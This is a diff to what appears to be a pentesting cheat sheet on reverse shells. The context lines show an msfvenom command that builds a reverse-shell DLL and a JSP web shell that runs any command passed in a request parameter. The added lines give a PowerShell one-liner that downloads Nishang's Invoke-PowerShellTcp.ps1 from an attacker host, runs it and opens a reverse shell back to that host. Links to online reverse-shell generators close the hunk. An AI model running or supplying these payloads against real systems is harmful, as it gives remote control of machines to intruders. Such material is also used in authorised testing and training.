@@ -100,6 +100,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
+#### ➤ Upload and execution
+```
+# This reverse shell download a reverse shell name Invoke-PowerShellTcp.ps1 and execute it to obtain a reverse shell
+# Reverse shell : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 443
+```
+
 ## 🔻Online Generator
 https://www.revshells.com/
 https://weibell.github.io/reverse-shell-generator/
